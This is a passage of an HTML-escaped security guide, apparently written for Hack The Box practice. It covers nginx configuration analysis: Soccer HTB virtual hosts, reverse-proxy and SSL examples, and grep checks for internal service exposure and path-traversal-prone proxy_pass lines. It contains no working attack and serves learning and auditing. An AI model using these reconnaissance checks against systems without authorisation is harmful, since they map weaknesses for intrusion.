class=\"s\"\u003ehttp://localhost:3000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_http_version\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"s\"\u003e.1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eUpgrade\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eConnection\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;upgrade\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eHost\u003c/span\u003e \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_cache_bypass\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"real-world-example-soccer-htb\"\u003eReal-World Example: Soccer HTB\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# From Soccer HTB - Multiple virtual hosts found\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eserver\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"s\"\u003e[::]:80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver_name\u003c/span\u003e \u003cspan class=\"s\"\u003esoccer.htb\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eroot\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/www/html\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eindex\u003c/span\u003e \u003cspan class=\"s\"\u003eindex.html\u003c/span\u003e \u003cspan class=\"s\"\u003eindex.htm\u003c/span\u003e \u003cspan class=\"s\"\u003eindex.nginx-debian.html\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003etry_files\u003c/span\u003e \u003cspan class=\"nv\"\u003e$uri\u003c/span\u003e \u003cspan class=\"nv\"\u003e$uri/\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e404\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Additional virtual host discovered\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eserver\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"s\"\u003e[::]:80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver_name\u003c/span\u003e \u003cspan class=\"s\"\u003esoc-player.soccer.htb\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eroot\u003c/span\u003e \u003cspan class=\"s\"\u003e/root/app/views\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://localhost:3000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_http_version\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"s\"\u003e.1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eUpgrade\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eConnection\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;upgrade\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eHost\u003c/span\u003e \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_cache_bypass\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"proxy-configuration-analysis\"\u003eProxy Configuration Analysis\u003c/h2\u003e\n\u003ch3 id=\"reverse-proxy-configurations\"\u003eReverse Proxy Configurations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic reverse proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://backend_server\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eHost\u003c/span\u003e \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Real-IP\u003c/span\u003e \u003cspan class=\"nv\"\u003e$remote_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Forwarded-For\u003c/span\u003e \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Forwarded-Proto\u003c/span\u003e \u003cspan class=\"nv\"\u003e$scheme\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# WebSocket proxy configuration\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/websocket\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://localhost:9091\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_http_version\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"s\"\u003e.1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eUpgrade\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eConnection\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;upgrade\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_set_header\u003c/span\u003e \u003cspan class=\"s\"\u003eHost\u003c/span\u003e \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Load balancing\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eupstream\u003c/span\u003e \u003cspan class=\"s\"\u003ebackend\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver\u003c/span\u003e \u003cspan class=\"n\"\u003e192.168.1.10\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver\u003c/span\u003e \u003cspan class=\"n\"\u003e192.168.1.11\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver\u003c/span\u003e \u003cspan class=\"n\"\u003e192.168.1.12\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://backend\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"proxy-security-issues\"\u003eProxy Security Issues\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for missing security headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_set_header.*X-Forwarded\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_set_header.*Host\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for proxy_pass misconfigurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_pass\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Look for internal service exposure\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_pass.*127.0.0.1\\|localhost\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for missing trailing slashes (path traversal)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_pass.*[^/]\u003c/span\u003e$\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"ssltls-configuration-analysis\"\u003eSSL/TLS Configuration Analysis\u003c/h2\u003e\n\u003ch3 id=\"ssl-configuration\"\u003eSSL Configuration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eserver\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"mi\"\u003e443\u003c/span\u003e \u003cspan class=\"s\"\u003essl\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"s\"\u003e[::]:443\u003c/span\u003e \u003cspan class=\"s\"\u003essl\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver_name\u003c/span\u003e \u003cspan class=\"s\"\u003eexample.com\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSL certificates\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003essl_certificate\u003c/span\u003e \u003cspan class=\"s\"\u003e/path/to/cert.pem\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003essl_certificate_key\u003c/span\u003e \u003cspan class=\"s\"\u003e/path/to/private.key\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSL protocols and ciphers\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003essl_protocols\u003c/span\u003e \u003cspan class=\"s\"\u003eTLSv1.2\u003c/span\u003e \u003cspan class=\"s\"\u003eTLSv1.3\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003essl_ciphers\u003c/span\u003e \u003cspan class=\"s\"\u003eECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan class=\"no\"\u003eoff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSL security headers\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eStrict-Transport-Security\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;max-age=63072000\u0026#34;\u003c/span\u003e \u003cspan class=\"s\"\u003ealways\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Frame-Options\u003c/span\u003e \u003cspan class=\"s\"\u003eDENY\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Content-Type-Options\u003c/span\u003e \u003cspan class=\"s\"\u003enosniff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ssl-security-checks\"\u003eSSL Security Checks\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check SSL configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;ssl_\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for weak SSL protocols\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;ssl_protocols\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Should not include SSLv2, SSLv3, TLSv1, TLSv1.1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check SSL certificate paths\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;ssl_certificate\u0026#34;\u003c/span\u003e 